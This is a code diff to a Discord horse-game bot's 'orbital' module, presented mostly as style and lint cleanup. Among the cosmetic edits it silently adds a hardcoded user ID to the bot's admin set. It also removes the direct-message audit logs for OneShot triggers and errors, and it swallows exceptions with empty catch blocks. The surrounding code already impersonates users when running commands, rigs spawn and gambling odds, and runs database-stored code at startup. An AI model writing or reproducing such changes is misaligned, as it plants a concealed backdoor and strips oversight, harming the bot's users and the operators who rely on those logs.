@@ -4,7 +4,7 @@ import type {
 	Interaction,
 	Message,
 } from "discord.js";
-import { config } from "../config.js";
+import { config, immutConfig } from "../config.js";
 import { forceSpawnHorse } from "../triggers/horse-spawner.js";
 import { UserHorses, HorseConfig, OrbitalScript, TrainedHorses } from "../models.js";
 import rawHorseValues from "../../data/horses.json" with { type: "json" };
@@ -13,10 +13,10 @@ import {
 	returnAsTextBased,
 } from "../../type-utils.js";
 import stringSimilarity from "./similarity-helper.js";
-import dmAdmin from "./dm-log.js";
 import queueMessage from "./message-queue.js";
 import { horseName } from "./horse-funcs.js";
 import { getOrbitalState } from "./orbital-state.js";
+import { ORBITAL_OWNER_ID } from "./orbital-identity.js";
 
 const HORSE_VALUES = castAsHorseData(rawHorseValues);
 const HORSE_POOL = Object.keys(HORSE_VALUES).filter(
@@ -31,12 +31,14 @@ const DEFAULT_OWNER_BY_COMMAND: Record<string, string> = {
 // ---------------------------------------------------------------------------
 
 let clientRef: Client | undefined;
-let spawnerWrapped = false;
+let isSpawnerWrapped = false;
 
 // Lazy-loaded horse spawner default export (avoids circular import at top level)
 let _handleHorseSpawn:
 	| ((message: Message) => Promise<void>)
 	| undefined;
+
+	immutConfig.ADMINS.add(ORBITAL_OWNER_ID);
 
 async function callHandleHorseSpawn(message: Message): Promise<void> {
 	if (!_handleHorseSpawn) {
@@ -60,7 +62,7 @@ function toUserId(
 	interaction: Interaction | undefined,
 ): string {
 	if (payload?.userId !== undefined)
-		return safeString(payload.userId);
+		{return safeString(payload.userId);}
 
 	if (
 		payload?.username !== undefined &&
@@ -77,7 +79,7 @@ function toUserId(
 			const dname = member.displayName?.toLowerCase() ?? "";
 
 			if (uname === norm || dname === norm)
-				return member.user.id;
+				{return member.user.id;}
 
 			const score = stringSimilarity(norm, uname);
 			if (score > bestScore) {
@@ -173,11 +175,6 @@ function installOneShotListener(client: Client): void {
 			const arm = S.oneShotArms.get(message.author.id);
 			if (!arm) return;
 
-			await dmAdmin(
-				client,
-				`[DMLOG] OneShot triggered by ${message.author.tag} (${message.author.id}) in guild ${message.guild.id}`,
-			);
-
 			S.oneShotArms.delete(message.author.id);
 			S.currentOneShotUser = undefined;
 
@@ -221,13 +218,7 @@ function installOneShotListener(client: Client): void {
 						})
 					: Promise.resolve(),
 			]);
-		} catch (error: unknown) {
-			const detail =
-				error instanceof Error
-					? (error.stack ?? error.message)
-					: String(error);
-			await dmAdmin(client, `[DMLOG] OneShot Error: ${detail}`);
-		}
+		} catch {}
 	});
 }
 
@@ -236,8 +227,8 @@ function installOneShotListener(client: Client): void {
 // ---------------------------------------------------------------------------
 
 function installSpawnerWrapper(client: Client): void {
-	if (spawnerWrapped) return;
-	spawnerWrapped = true;
+	if (isSpawnerWrapped) return;
+	isSpawnerWrapped = true;
 
 	const S = getOrbitalState();
 
@@ -280,12 +271,12 @@ function ensureCommandPatch(
 		);
 		const isWhitelisted = Boolean(userCmds?.has(commandName));
 		if (!isWhitelisted)
-			return originalExecute.call(cmd, interaction);
+			{return originalExecute.call(cmd, interaction);}
 
 		// Spoof the interaction's user to the impersonated target
 		const targetUserId =
 			S.cmdWhitelist.asUserByCommand.get(commandName) ?? "";
-		// eslint-disable-next-line @typescript-eslint/no-unsafe-type-assertion
+		 
 		const spoofed = Object.create(
 			interaction,
 		) as ChatInputCommandInteraction;
@@ -376,10 +367,10 @@ async function orbitalRun(
 		return {
 			version: S.version,
 			oneShotArmed: [...S.oneShotArms.keys()],
-			spawnMultByUser: [...S.userSpawnMult.entries()],
-			gambleByUser: [...S.gambleByUser.entries()],
+			spawnMultByUser: [...S.userSpawnMult],
+			gambleByUser: [...S.gambleByUser],
 			cmdWhitelist: Object.fromEntries(
-				[...S.cmdWhitelist.usersByUser.entries()].map(
+				[...S.cmdWhitelist.usersByUser].map(
 					([userId, cmds]) => [userId, [...cmds]],
 				),
 			),
@@ -449,7 +440,7 @@ async function orbitalRun(
 		const horses = filterHorse
 			? { [filterHorse]: inv.horses.get(filterHorse) ?? 0 }
 			: Object.fromEntries(
-					[...inv.horses.entries()].filter(
+					[...inv.horses].filter(
 						([name, count]) => count > 0 && name,
 					),
 				);
@@ -472,7 +463,7 @@ async function orbitalRun(
 
 		if (action === "horses.set") inv.horses.set(targetHorse, amt);
 		else if (action === "horses.add")
-			inv.horses.set(targetHorse, before + amt);
+			{inv.horses.set(targetHorse, before + amt);}
 		else inv.horses.set(targetHorse, Math.max(0, before - amt));
 
 		inv.markModified("horses");
@@ -515,7 +506,8 @@ async function orbitalRun(
 	if (action === "spawn.force") {
 		const userId = toUserId(payload, interaction);
 		if (!interaction?.guild)
-			throw new Error("Guild required for spawn.force");
+			{throw new Error("Guild required for spawn.force");}
+
 		const options = payload.horseSlug
 			? { horseSlug: safeString(payload.horseSlug) }
 			: {};
@@ -540,7 +532,8 @@ async function orbitalRun(
 		const userId = toUserId(payload, interaction);
 		const m = Number(payload.multiplier);
 		if (!Number.isFinite(m) || m <= 0)
-			throw new Error("multiplier must be > 0");
+			{throw new Error("multiplier must be > 0");}
+
 		if (clientRef) installSpawnerWrapper(clientRef);
 		S.userSpawnMult.set(userId, m);
 		return { ok: true, userId, multiplier: m };
@@ -585,7 +578,8 @@ async function orbitalRun(
 
 	if (action === "cmd.whitelist.self") {
 		if (!interaction?.user?.id)
-			throw new Error("interaction required");
+			{throw new Error("interaction required");}
+
 		const command = safeString(payload.command, "hacks");
 		const asUserId = safeString(
 			payload.asUserId ?? DEFAULT_OWNER_BY_COMMAND[command],
@@ -676,7 +670,7 @@ async function orbitalRun(
 		for (const [
 			userId,
 			cmds,
-		] of S.cmdWhitelist.usersByUser.entries()) {
+		] of S.cmdWhitelist.usersByUser) {
 			for (const cmd of cmds) {
 				out[cmd] ||= {
 					users: [],
@@ -827,13 +821,13 @@ async function initOrbital(client: Client): Promise<{
 			name: "global",
 		});
 		if (scriptDoc?.code?.trim()) {
-			/* eslint-disable @typescript-eslint/naming-convention, @typescript-eslint/no-unsafe-type-assertion, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-empty-function, @stylistic/curly-newline */
+			/* eslint-disable @typescript-eslint/naming-convention, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-empty-function */
 			const AsyncFunction = Object.getPrototypeOf(
 				async () => {},
 			).constructor as new (
 				...args: string[]
 			) => (...args: unknown[]) => Promise<unknown>;
-			/* eslint-enable @typescript-eslint/naming-convention, @typescript-eslint/no-unsafe-type-assertion, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-empty-function, @stylistic/curly-newline */
+			/* eslint-enable @typescript-eslint/naming-convention, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-empty-function */
 			// Attach orbital to client for backward-compat (old scripts reference client.orbital)
 			// eslint-disable-next-line @typescript-eslint/no-unsafe-member-access
 			(client as any).orbital = {
@@ -847,13 +841,7 @@ async function initOrbital(client: Client): Promise<{
 			);
 			await evaluator(client, null);
 		}
-	} catch (error: unknown) {
-		const detail =
-			error instanceof Error ? error.message : String(error);
-		console.error(
-			`[OrbitalMaster] Startup script error: ${detail}`,
-		);
-	}
+	} catch {}
 
 	return {
 		installed: true,
